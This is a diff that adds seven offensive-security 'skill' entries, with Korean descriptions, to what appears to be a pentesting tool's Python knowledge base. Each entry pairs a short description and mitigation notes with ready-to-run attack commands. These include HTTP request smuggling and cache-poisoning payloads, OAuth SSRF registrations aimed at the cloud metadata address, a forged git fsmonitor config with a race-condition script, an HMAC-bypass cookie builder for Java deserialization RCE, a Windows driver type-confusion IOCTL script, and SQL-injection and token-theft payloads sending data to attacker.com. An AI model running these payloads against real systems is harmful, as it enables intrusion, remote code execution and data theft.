@@ -2275,6 +2275,489 @@ print([r.status_code for r in results])""",
     ),
 },
 
+
+# ── v3.2.68 신규 스킬 ─────────────────────────────────────────────────────────
+
+"sec-cpp-libc-gotcha": {
+    "name": "C/C++ Linux libc 함정 & seccomp/BPF 샌드박스 우회",
+    "module": "SecSkills-Binary",
+    "tags": ["c", "cpp", "libc", "inet-ntoa", "format-string", "seccomp", "bpf",
+             "io-uring", "clone-untraced", "sandbox-bypass", "binary-review"],
+    "desc": (
+        "Trail of Bits Testing Handbook C/C++ 챕터 기반. "
+        "Linux libc 주요 함정: inet_ntoa() 정적 버퍼 레이스 (snprintf와 동일 버퍼 재사용), "
+        "format string 취약점, getenv() 경쟁 조건, putenv() 메모리 수명 문제. "
+        "seccomp/BPF 샌드박스 우회: io_uring 시스템콜이 BPF 필터를 거치지 않고 실행 "
+        "(IORING_OP_* 미필터링), CLONE_UNTRACED 플래그로 ptrace 기반 샌드박스 무력화. "
+        "컴파일러 최적화로 인한 버그: 메모리 안전성 검사 제거, UB(미정의 동작) 악용."
+    ),
+    "tools": ["gcc", "clang", "gdb", "strace", "seccomp-tools", "python3"],
+    "commands": [
+        "# 1) inet_ntoa 레이스 조건 탐지 (정적 버퍼 재사용)",
+        "grep -rn 'inet_ntoa' . --include='*.c' --include='*.cpp'",
+        "# inet_ntoa 결과를 즉시 복사하지 않으면 다음 호출에서 덮어씀",
+        "# 2) Format string 취약점 탐지",
+        "grep -rn 'printf(.*%s' . --include='*.c' | grep -v '\"'",
+        "# snprintf/printf 첫 인자가 사용자 입력이면 취약",
+        "# 3) seccomp BPF 필터 분석",
+        "seccomp-tools dump ./target_binary 2>/dev/null | head -50",
+        "# io_uring 관련 syscall 번호 확인 (x86_64: 425~)",
+        "python3 -c \"print([f'SYS_io_uring_{n}={425+i}' for i,n in enumerate(['setup','enter','register'])])\"",
+        "# 4) io_uring BPF 우회 탐지",
+        "python3 -c \""
+        "import subprocess; "
+        "result = subprocess.run(['seccomp-tools','dump','./binary'], capture_output=True, text=True); "
+        "lines = result.stdout; "
+        "print('VULNERABLE: io_uring not filtered' if '425' not in lines and '426' not in lines else 'io_uring filtered')\"",
+        "# 5) CLONE_UNTRACED 우회 탐지",
+        "grep -rn 'CLONE_UNTRACED\\|CLONE_NEWUSER' . --include='*.c'",
+        "# 6) 컴파일러 최적화 UB 감지 (AddressSanitizer)",
+        "gcc -fsanitize=address,undefined -O0 -g target.c -o target_asan && ./target_asan",
+        "# 7) 전체 바이너리 보호 확인",
+        "checksec --file=./target_binary",
+    ],
+    "notes": (
+        "[완화] inet_ntoa 대신 inet_ntop 사용(스레드 안전). "
+        "seccomp 필터에 io_uring 관련 syscall(425-427) 명시적 차단. "
+        "CLONE_UNTRACED 플래그 사용 금지 정책 적용. "
+        "-fstack-protector-strong, -D_FORTIFY_SOURCE=2 컴파일 옵션 적용. "
+        "[레퍼런스] "
+        "Trail of Bits Testing Handbook — C/C++ Security Checklist (2026), "
+        "Linux man page: seccomp(2), io_uring(7), clone(2)"
+    ),
+},
+
+"sec-windows-driver-registry-tycon": {
+    "name": "Windows WDF 드라이버 RTL_QUERY_REGISTRY_TABLE 타입 혼동 → 커널 코드 실행",
+    "module": "SecSkills-Binary",
+    "tags": ["windows", "kernel", "wdf", "driver", "registry", "type-confusion",
+             "rtl-query-registry", "kernel-rce", "dos", "windbg"],
+    "desc": (
+        "WDF(Windows Driver Framework) 드라이버에서 "
+        "RTL_QUERY_REGISTRY_TABLE + RTL_QUERY_REGISTRY_DIRECT 플래그 조합 취약점. "
+        "공격자가 레지스트리 값 타입을 REG_BINARY/REG_SZ 대신 REG_MULTI_SZ 등으로 설정 시 "
+        "EntryContext 포인터가 함수 포인터로 해석되어 커널 코드 실행 가능. "
+        "QueryRoutine=NULL + DIRECT 플래그 조합은 값 크기/타입 검증 없이 직접 쓰기. "
+        "쉬운 DoS: 올바르지 않은 타입의 큰 값 설정 → 커널 버퍼 오버플로우."
+    ),
+    "tools": ["windbg", "regedit", "python3", "ctypes", "pe-studio"],
+    "commands": [
+        "# 1) 드라이버 내 RTL_QUERY_REGISTRY_TABLE 사용 탐지",
+        "strings target.sys | grep -i 'registry\\|RegQueryValue'",
+        "# IDA/Ghidra에서 RtlQueryRegistryValues 호출 확인",
+        "# 2) IOCTL 입력 레지스트리 경로 제어 가능 여부 확인",
+        "# WdfRequestRetrieveInputBuffer로 받은 regPath가 공격자 제어 가능한지 분석",
+        "# 3) Python으로 레지스트리 타입 조작 (Windows 환경)",
+        "python3 -c \""
+        "import winreg; "
+        "key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\\AttackerKey'); "
+        "# REG_BINARY 대신 REG_MULTI_SZ 타입으로 MajorVersion 값 설정 (타입 혼동)"
+        "winreg.SetValueEx(key, 'MajorVersion', 0, winreg.REG_MULTI_SZ, ['\\x00' * 256]); "
+        "print('Registry type confusion payload written')\"",
+        "# 4) DoS 페이로드 — 큰 값으로 커널 버퍼 오버플로우 유도",
+        "python3 -c \""
+        "import winreg; "
+        "key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\\AttackerKey'); "
+        "winreg.SetValueEx(key, 'MajorVersion', 0, winreg.REG_BINARY, b'A' * 0x1000); "
+        "print('DoS payload: oversized REG_BINARY value set')\"",
+        "# 5) IOCTL 전송 (드라이버 통신)",
+        "python3 -c \""
+        "import ctypes, struct; "
+        "kernel32 = ctypes.windll.kernel32; "
+        "hDevice = kernel32.CreateFileW(r'\\\\\\\\.\\\\TargetDriver', 0xC0000000, 0, None, 3, 0, None); "
+        "regPath = r'\\Registry\\Machine\\SOFTWARE\\AttackerKey\\0'; "
+        "payload = regPath.encode('utf-16-le') + b'\\x00\\x00'; "
+        "kernel32.DeviceIoControl(hDevice, 0x222004, payload, len(payload), None, 0, None, None); "
+        "print('IOCTL sent with attacker registry path')\"",
+        "# 6) WinDbg로 드라이버 분석",
+        "# !drvobj TargetDriver 7",
+        "# bp nt!RtlQueryRegistryValues",
+    ],
+    "notes": (
+        "[완화] RTL_QUERY_REGISTRY_DIRECT 대신 QueryRoutine 콜백 사용. "
+        "레지스트리 값 타입(Type 필드) 명시적 검증. "
+        "공격자 제어 레지스트리 경로 허용 금지. "
+        "Driver Verifier 활성화로 풀 손상 조기 탐지. "
+        "[레퍼런스] "
+        "Trail of Bits Testing Handbook — Windows Kernel Driver Security (2026), "
+        "Microsoft Docs: RTL_QUERY_REGISTRY_TABLE, "
+        "NtQueryKey / ZwQueryValueKey 안전 대안"
+    ),
+},
+
+"sec-web-oauth-dcr-ssrf-chain": {
+    "name": "OAuth DCR + Open Redirect + Path Normalization → Full-Read SSRF 체인",
+    "module": "SecSkills-Web",
+    "tags": ["oauth", "dcr", "dynamic-client-registration", "ssrf", "open-redirect",
+             "path-normalization", "full-read-ssrf", "redirect-uri", "chain"],
+    "desc": (
+        "OAuth 2.0 Dynamic Client Registration(DCR, RFC 7591)의 redirect_uri 미검증 + "
+        "Open URL Redirect + URL 경로 정규화 불일치를 3단 체이닝해 Full-Read SSRF 달성. "
+        "공격 흐름: 1) DCR으로 임의 redirect_uri 등록 "
+        "(예: https://attacker.com/callback#@internal-host/) "
+        "2) 인가 서버의 Open Redirect 취약점으로 SSRF 방어 우회 "
+        "3) 서버/프록시 간 경로 정규화 차이(../·encoded slash)로 내부 경로 접근 "
+        "4) 인가 코드 또는 토큰이 SSRF 응답에 포함되어 완전 읽기. "
+        "내부 메타데이터 서버(AWS 169.254.169.254), 내부 API 완전 읽기 가능."
+    ),
+    "tools": ["burpsuite", "ffuf", "curl", "python3", "interactsh"],
+    "commands": [
+        "# 1) DCR 엔드포인트 탐지",
+        "curl -s https://TARGET/.well-known/oauth-authorization-server | python3 -m json.tool | grep registration",
+        "curl -s https://TARGET/.well-known/openid-configuration | grep registration_endpoint",
+        "# 2) 임의 redirect_uri로 클라이언트 등록 시도",
+        "curl -s -X POST https://TARGET/oauth/register "
+        "-H 'Content-Type: application/json' "
+        "-d '{\"redirect_uris\":[\"https://evil.com\"],\"client_name\":\"test\"}'",
+        "# 3) SSRF 페이로드를 redirect_uri에 삽입",
+        "curl -s -X POST https://TARGET/oauth/register "
+        "-H 'Content-Type: application/json' "
+        "-d '{\"redirect_uris\":[\"https://169.254.169.254/latest/meta-data/\"],\"client_name\":\"ssrf\"}'",
+        "# 4) Open Redirect 탐지 및 SSRF 우회 체인",
+        "# redirect_uri에 Open Redirect 엔드포인트 삽입",
+        "REDIRECT_URI='https://TARGET/oauth/authorize?redirect_uri=https://169.254.169.254/'",
+        "python3 -c \""
+        "import urllib.parse; "
+        "payload = {'redirect_uris': [urllib.parse.quote('https://TARGET/redirect?url=http://169.254.169.254/')]}; "
+        "print(payload)\"",
+        "# 5) 경로 정규화 우회",
+        "# ../·%2F·%252F·\\·//로 경로 정규화 차이 악용",
+        "python3 -c \""
+        "bypasses = ["
+        "    'https://TARGET/callback/../internal/',"
+        "    'https://TARGET/callback/%2F..%2Finternal/',"
+        "    'https://TARGET/callback\\/internal/',"
+        "    'https://TARGET@169.254.169.254/callback',"
+        "];"
+        "[print(b) for b in bypasses]\"",
+        "# 6) Full-Read SSRF 확인 (Interactsh)",
+        "# interactsh-client -server https://app.interactsh.com",
+        "# redirect_uri에 OOB 콜백 URL 삽입 후 토큰 수신 확인",
+        "curl -s 'https://TARGET/oauth/authorize?client_id=CLIENT_ID&redirect_uri=https://OOB.interactsh.com&response_type=code'",
+    ],
+    "notes": (
+        "[완화] DCR에서 redirect_uri 화이트리스트 검증. "
+        "Open Redirect 완전 제거 또는 검증된 도메인만 허용. "
+        "SSRF 방어: 내부 IP 범위 차단, DNS Rebinding 방지. "
+        "URL 정규화는 백엔드에서 일관되게 처리. "
+        "[레퍼런스] "
+        "eib.hashnode.dev — Crafting a Full-Read SSRF via OAuth DCR + Open URL Redirects + Path Normalization, "
+        "RFC 7591 — OAuth 2.0 Dynamic Client Registration Protocol, "
+        "PortSwigger — SSRF via Open Redirection"
+    ),
+},
+
+"sec-web-smuggling-upgrade-bypass": {
+    "name": "HTTP Upgrade 헤더 미검증 패스스루 + TE 파싱 오류 → Request Smuggling + Cache Poisoning",
+    "module": "SecSkills-Web",
+    "tags": ["http-smuggling", "request-smuggling", "upgrade-header", "transfer-encoding",
+             "cache-poisoning", "pingora", "reverse-proxy", "cve-2026-2833", "rust"],
+    "desc": (
+        "Cloudflare Pingora 등 Rust 기반 리버스 프록시에서 발견된 HTTP Request Smuggling 취약점. "
+        "Bug 1 (CVE-2026-2833): Upgrade 헤더 수신 즉시 101 응답 대기 없이 TCP 바이트 패스스루 전환 "
+        "→ 다음 HTTP 요청이 프록시 레이어를 우회해 백엔드로 직접 전달 (ACL/WAF/인증 우회). "
+        "Bug 2: Transfer-Encoding: chunked 헤더 말형성 처리 오류 → CL.TE/TE.CL 스머글링. "
+        "Bug 3: Cache Poisoning — 스머글된 요청으로 캐시에 악의적 응답 저장 → 다른 사용자 영향. "
+        "Pingora 0.8.0 이전 버전, Pingap, Encore 등 Pingora 기반 파생 프로젝트 포함."
+    ),
+    "tools": ["burpsuite", "curl", "python3", "smuggler.py", "http-request-smuggler"],
+    "commands": [
+        "# 1) Upgrade 헤더 패스스루 취약점 탐지 (CVE-2026-2833)",
+        "python3 -c \""
+        "import socket; "
+        "s = socket.create_connection(('TARGET', 80)); "
+        "payload = ("
+        "    b'GET / HTTP/1.1\\r\\n'"
+        "    b'Host: TARGET\\r\\n'"
+        "    b'Upgrade: xxx\\r\\n'"
+        "    b'Connection: Upgrade\\r\\n'"
+        "    b'\\r\\n'"
+        "    b'GET /admin HTTP/1.1\\r\\n'"
+        "    b'Host: TARGET\\r\\n'"
+        "    b'\\r\\n'"
+        "); "
+        "s.send(payload); "
+        "resp = s.recv(4096); "
+        "print('VULNERABLE' if b'admin' in resp.lower() or b'401' not in resp else 'OK')\"",
+        "# 2) TE.CL 스머글링 탐지",
+        "python3 -c \""
+        "import socket; "
+        "s = socket.create_connection(('TARGET', 80)); "
+        "payload = ("
+        "    b'POST / HTTP/1.1\\r\\n'"
+        "    b'Host: TARGET\\r\\n'"
+        "    b'Transfer-Encoding: chunked\\r\\n'"
+        "    b'Content-Length: 4\\r\\n'"
+        "    b'\\r\\n'"
+        "    b'5c\\r\\n'"
+        "    b'GPOST / HTTP/1.1\\r\\nHost: TARGET\\r\\nContent-Length: 15\\r\\n\\r\\n'"
+        "    b'0\\r\\n'"
+        "    b'\\r\\n'"
+        "); "
+        "s.send(payload); "
+        "print(s.recv(4096).decode(errors='ignore'))\"",
+        "# 3) Cache Poisoning 체인",
+        "# 스머글된 요청으로 GET /로 캐시 오염",
+        "python3 -c \""
+        "# Step1: 스머글로 악의적 응답 캐시에 저장",
+        "import requests; "
+        "r = requests.get('https://TARGET/', headers={"
+        "    'Transfer-Encoding': ' chunked',"
+        "    'X-Forwarded-Host': 'evil.com'"
+        "}); "
+        "print('Cache poisoning attempted:', r.status_code)\"",
+        "# 4) Pingora 버전 탐지",
+        "curl -sI https://TARGET/ | grep -i 'server\\|x-powered\\|via'",
+        "# 5) 자동화 도구",
+        "python3 smuggler.py -u https://TARGET/ -l 5 2>/dev/null | tail -20",
+    ],
+    "notes": (
+        "[완화] Pingora → 0.8.0 이상 업그레이드. "
+        "Upgrade 헤더 처리 시 101 Switching Protocols 응답 수신 후 패스스루 전환. "
+        "TE 헤더 엄격한 파싱(말형성 chunked 인코딩 거부). "
+        "Cache 키에 요청 바디 포함. "
+        "[레퍼런스] "
+        "xclow3n.com — Breaking Pingora: HTTP Request Smuggling & Cache Poisoning (CVE-2026-2833), "
+        "Cloudflare Blog — Pingora 0.8.0 Security Fix, "
+        "PortSwigger — HTTP Request Smuggling"
+    ),
+},
+
+"sec-cloud-git-toctou-fsmonitor-rce": {
+    "name": "Git 디렉터리 삭제 TOCTOU + fsmonitor Hook → RCE + K8s 권한상승",
+    "module": "SecSkills-Cloud",
+    "tags": ["git", "toctou", "race-condition", "fsmonitor", "rce", "looker",
+             "google-cloud", "kubernetes", "service-account", "path-traversal"],
+    "desc": (
+        "Google Cloud Looker의 Git 통합 기능에서 발견된 디렉터리 삭제 TOCTOU 레이스 → RCE. "
+        "공격 흐름: 1) dir_path_array=[\"/\"]로 validate_dir_name() 우회 (.git 검증 로직 우회) "
+        "2) FileUtils.rm_rf의 postorder 삭제 중 .git이 먼저 삭제되는 타이밍 윈도우 이용 "
+        "3) worktree에 미리 배치한 forged config (fsmonitor 훅 포함) 활성화 "
+        "4) 병렬 git status 요청으로 fsmonitor 훅 트리거 → 임의 명령 실행 "
+        "5) Kubernetes 서비스 계정 secrets update 권한 악용 → 동일 클러스터 타 인스턴스 접근. "
+        "Git 프로젝트 관리 기능이 있는 자체 호스팅 BI/웹 애플리케이션 전반에 적용 가능."
+    ),
+    "tools": ["burpsuite", "curl", "python3", "kubectl", "git"],
+    "commands": [
+        "# 1) Looker Git 삭제 API 취약점 탐지",
+        "# dir_path_array=[\"/\"]로 루트 삭제 시도",
+        "python3 -c \""
+        "import requests, json; "
+        "TARGET = 'https://LOOKER-TARGET'; "
+        "TOKEN = 'YOUR_API_TOKEN'; "
+        "headers = {'Authorization': f'token {TOKEN}', 'Content-Type': 'application/json'}; "
+        "# 정상 요청으로 프로젝트 확인"
+        "r = requests.get(f'{TARGET}/api/4.0/projects', headers=headers); "
+        "projects = r.json(); "
+        "print('Projects:', [p['id'] for p in projects[:3]])\"",
+        "# 2) fsmonitor 훅 forged config 준비",
+        "python3 -c \""
+        "config_content = '''[core]\\n'"
+        "    bare = false\\n'"
+        "    worktree = \\\".\\\"\\n'"
+        "    fsmonitor = \\\"id > /tmp/pwned.txt\\\"\\n'"
+        "'''; "
+        "print('Forged git config:'); print(config_content)\"",
+        "# 3) TOCTOU 레이스 조건 공격 — 병렬 요청",
+        "python3 -c \""
+        "import requests, threading, time; "
+        "TARGET = 'https://LOOKER-TARGET'; "
+        "TOKEN = 'YOUR_API_TOKEN'; "
+        "PROJECT_ID = 'target-project'; "
+        "headers = {'Authorization': f'token {TOKEN}', 'Content-Type': 'application/json'}; "
+        "def trigger_git_status():"
+        "    for _ in range(100):"
+        "        requests.post(f'{TARGET}/api/internal/projects/{PROJECT_ID}/git_status', headers=headers);"
+        "        time.sleep(0.01);"
+        "def delete_repo():"
+        "    requests.post("
+        "        f'{TARGET}/api/internal/projects/{PROJECT_ID}/delete_dir',"
+        "        headers=headers,"
+        "        json={'dir_path_array': ['/']},"
+        "    );"
+        "t1 = threading.Thread(target=trigger_git_status); "
+        "t2 = threading.Thread(target=delete_repo); "
+        "t1.start(); time.sleep(0.1); t2.start(); "
+        "t1.join(); t2.join(); "
+        "print('Race condition attack complete')\"",
+        "# 4) K8s 서비스 계정 권한 확인 (RCE 후)",
+        "# kubectl auth can-i update secrets -n looker",
+        "# curl -sk https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces/looker/secrets \\",
+        "# -H 'Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)'",
+        "# 5) K8s secrets 업데이트로 타 인스턴스 접근",
+        "# kubectl patch secret TARGET_SECRET -n looker --type='json' -p='[{\"op\":\"replace\",\"path\":\"/data/password\",\"value\":\"BASE64_PAYLOAD\"}]'",
+    ],
+    "notes": (
+        "[완화] dir_path_array 입력 시 루트('/')·빈 경로 명시적 거부. "
+        "Git 훅 실행 비활성화 (core.hooksPath=/dev/null). "
+        "파일 삭제 전 .git 존재 여부 재검증. "
+        "K8s 서비스 계정 최소 권한 원칙 (secrets update 권한 불필요 시 제거). "
+        "[레퍼런스] "
+        "flatt.tech — Remote Command Execution in Google Cloud with Single Directory Deletion (2026), "
+        "Google Cloud VRP bugSWAT — Looker Git Integration RCE, "
+        "Git Documentation — fsmonitor hook"
+    ),
+},
+
+"sec-web-hmac-bypass-deser": {
+    "name": "HMAC IV 구조 오류 서명 우회 → Java ObjectInputStream 역직렬화 RCE",
+    "module": "SecSkills-Web",
+    "tags": ["hmac", "signature-bypass", "broken-crypto", "java-deserialization",
+             "objectinputstream", "cookie", "rce", "opentext", "otds", "ysoserial"],
+    "desc": (
+        "OpenText Directory Services(OTDS) 쿠키 처리에서 발견된 HMAC 서명 우회 → 역직렬화 RCE. "
+        "취약점: getByteArrayFromSignedArray()에서 HMAC 계산 시 mac.update(iv) 후 mac.doFinal(message) 실행 "
+        "→ IV와 message가 분리된 구조에서 IV 값을 임의로 설정해 동일한 HMAC 서명 생성 가능. "
+        "splitByteArray()의 Length-Prefixed 포맷을 악용해 IV·message 경계 조작. "
+        "결과: 서명 검증 통과 → ObjectInputStream.readObject() 호출 → ysoserial 페이로드로 RCE. "
+        "인증 없이(쿠키 조작만으로) 익스플로잇 가능."
+    ),
+    "tools": ["python3", "ysoserial", "burpsuite", "java", "curl"],
+    "commands": [
+        "# 1) 취약 엔드포인트 탐지 (쿠키 기반 역직렬화)",
+        "curl -s -I https://TARGET/otdsws/ | grep -i 'set-cookie'",
+        "# cookieToMap 호출 추적: OTDSESSION 등 쿠키 확인",
+        "# 2) HMAC IV 구조 분석",
+        "python3 -c \""
+        "import struct, base64; "
+        "# 취약한 splitByteArray 포맷: [2B len][sig][2B len][iv][2B len][message]"
+        "def build_payload(signature, iv, message):"
+        "    return (struct.pack('>H', len(signature)) + signature +"
+        "            struct.pack('>H', len(iv)) + iv +"
+        "            struct.pack('>H', len(message)) + message);"
+        "# HMAC 계산: mac.update(iv); mac.doFinal(message)"
+        "# → iv와 message를 조작해 동일 signature 생성 가능"
+        "import hmac, hashlib; "
+        "key = b'\\x00' * 16; "
+        "iv = b'A' * 16; "
+        "message = b'PLACEHOLDER_PAYLOAD'; "
+        "mac = hmac.new(key, iv + message, hashlib.sha1).digest(); "
+        "print('HMAC:', mac.hex())\"",
+        "# 3) ysoserial 역직렬화 페이로드 생성",
+        "# java -jar ysoserial.jar CommonsCollections6 'id > /tmp/rce.txt' > /tmp/payload.ser",
+        "python3 -c \""
+        "import subprocess; "
+        "result = subprocess.run("
+        "    ['java', '-jar', 'ysoserial.jar', 'CommonsCollections6', 'id'],"
+        "    capture_output=True"
+        "); "
+        "print('Payload size:', len(result.stdout), 'bytes')\"",
+        "# 4) HMAC 우회 + 역직렬화 페이로드 쿠키 생성",
+        "python3 -c \""
+        "import hmac, hashlib, struct, base64, zlib; "
+        "key = b'TARGET_SECRET_KEY'; "
+        "ysoserial_payload = open('/tmp/payload.ser', 'rb').read(); "
+        "compressed = zlib.compress(ysoserial_payload); "
+        "iv = b'\\x00' * 16; "
+        "mac = hmac.new(key, iv, hashlib.sha1); "
+        "mac.update(compressed); "
+        "signature = mac.digest(); "
+        "cookie_bytes = ("
+        "    struct.pack('>H', len(signature)) + signature +"
+        "    struct.pack('>H', len(iv)) + iv +"
+        "    struct.pack('>H', len(compressed)) + compressed"
+        "); "
+        "cookie_b64 = base64.b64encode(cookie_bytes).decode(); "
+        "print(f'Cookie: OTDSESSION={cookie_b64}')\"",
+        "# 5) 쿠키로 RCE 트리거",
+        "# curl -s https://TARGET/otdsws/ -H 'Cookie: OTDSESSION=PAYLOAD_B64'",
+    ],
+    "notes": (
+        "[완화] HMAC 계산 시 IV를 메시지에 포함하거나 별도 검증하지 말 것 (IV 분리 구조 폐기). "
+        "Mac.update() 호출 순서 및 범위 명확히 정의. "
+        "역직렬화 시 ObjectInputStream 대신 안전한 직렬화 라이브러리 사용. "
+        "deserialization 필터 적용 (Java 9+ ObjectInputFilter). "
+        "[레퍼런스] "
+        "slcyber.io — Almost Impossible: Java Deserialization Through Broken Crypto in OpenText Directory Services (2026), "
+        "ysoserial — Java Deserialization Gadget Chains"
+    ),
+},
+
+"sec-cloud-bi-cross-tenant-sqli": {
+    "name": "Cloud BI 플랫폼 크로스 테넌트 SQL Injection (0-click/1-click) + XS-Leak + Denial of Wallet",
+    "module": "SecSkills-Cloud",
+    "tags": ["looker-studio", "google-cloud", "bigquery", "cross-tenant", "sql-injection",
+             "0-click", "1-click", "xs-leak", "denial-of-wallet", "bi-platform", "leakylooker"],
+    "desc": (
+        "Tenable LeakyLooker 연구 기반 Cloud BI 플랫폼(Google Looker Studio) 크로스 테넌트 취약점 9개. "
+        "Owner 자격증명 모델(0-click): 공격자가 보고서에 악의적 SQL 쿼리 주입 "
+        "→ 서버 측에서 피해자 Owner 토큰으로 BigQuery/Spanner/DB 실행 "
+        "→ 피해자 전체 데이터셋 탈취(클릭 불필요). "
+        "Viewer 자격증명 모델(1-click): 악의적 링크 클릭 시 피해자 권한으로 SQL 실행. "
+        "XS-Leak: frame counting·timing oracle로 다른 테넌트 데이터 추론. "
+        "Denial of Wallet: BigQuery 대용량 쿼리 강제 실행으로 피해자 비용 폭탄. "
+        "하이퍼링크/이미지 렌더링으로 자격증명 탈취."
+    ),
+    "tools": ["burpsuite", "curl", "python3", "google-cloud-sdk"],
+    "commands": [
+        "# 1) Looker Studio 보고서 API 탐지",
+        "curl -s 'https://lookerstudio.google.com/api/ds/v1/datasources' "
+        "-H 'Authorization: Bearer YOUR_TOKEN' | python3 -m json.tool | head -40",
+        "# 2) 0-click SQL Injection — Owner 자격증명 악용",
+        "python3 -c \""
+        "import requests, json; "
+        "# Alias Injection: 필드 alias에 SQL 주입"
+        "payload = {"
+        "    'datasourceId': 'VICTIM_DATASOURCE_ID',"
+        "    'fields': [{"
+        "        'id': 'qt_test',"
+        "        'name': \\\"qt_test' UNION SELECT session_user()--\\\","
+        "        'type': 'TEXT'"
+        "    }]"
+        "}; "
+        "r = requests.post("
+        "    'https://lookerstudio.google.com/api/ds/v1/query',"
+        "    json=payload,"
+        "    headers={'Authorization': 'Bearer YOUR_TOKEN'}"
+        "); "
+        "print('SQL Injection result:', r.text[:500])\"",
+        "# 3) BigQuery Denial of Wallet 공격",
+        "python3 -c \""
+        "# 피해자 BigQuery에 대용량 쿼리 강제 실행"
+        "import requests; "
+        "dos_query = 'SELECT * FROM `bigquery-public-data.github_repos.contents` CROSS JOIN UNNEST(GENERATE_ARRAY(1,10000))'; "
+        "payload = {"
+        "    'datasourceId': 'VICTIM_DATASOURCE_ID',"
+        "    'query': dos_query"
+        "}; "
+        "r = requests.post("
+        "    'https://lookerstudio.google.com/api/ds/v1/query',"
+        "    json=payload,"
+        "    headers={'Authorization': 'Bearer YOUR_TOKEN'}"
+        "); "
+        "print('Denial of Wallet triggered:', r.status_code)\"",
+        "# 4) XS-Leak — Frame Counting Oracle",
+        "python3 -c \""
+        "# iframe frame count로 응답 크기 추론 → 데이터 유출"
+        "js_payload = '''<script>"
+        "function leak(url) {"
+        "    var w = window.open(url);"
+        "    setTimeout(() => {"
+        "        try { console.log('Frames:', w.length); } catch(e) {}"
+        "    }, 2000);"
+        "}"
+        "leak('https://lookerstudio.google.com/reporting/VICTIM_REPORT_ID');"
+        "</script>'''; "
+        "print('XS-Leak JS payload ready')\"",
+        "# 5) 공개 보고서에서 Owner 자격증명 데이터 접근",
+        "curl -s 'https://lookerstudio.google.com/reporting/SHARED_REPORT_ID/data' "
+        "-H 'Authorization: Bearer ATTACKER_TOKEN'",
+        "# 6) Hyperlink Injection — 자격증명 탈취",
+        "# 보고서 필드에 <a href='https://attacker.com/?token=__USER_TOKEN__'>Click</a> 주입",
+    ],
+    "notes": (
+        "[완화] BI 플랫폼에서 사용자 입력을 SQL alias/쿼리에 직접 삽입 금지. "
+        "Owner 자격증명 모델에서 쿼리 필드 엄격한 검증. "
+        "BigQuery 쿼리 비용 한도 설정 (maximum bytes billed). "
+        "X-Frame-Options: DENY로 XS-Leak 완화. "
+        "공유 보고서에 Origin 검증 추가. "
+        "[레퍼런스] "
+        "Tenable Research — LeakyLooker: Google Cloud Looker Studio Vulnerabilities (TRA-2025-27~41), "
+        "Google Cloud — Looker Studio Security Advisory, "
+        "portswigger.net — Cross-Site Leaks (XS-Leaks)"
+    ),
+},
+
 }
 
 # 인덱스 생성
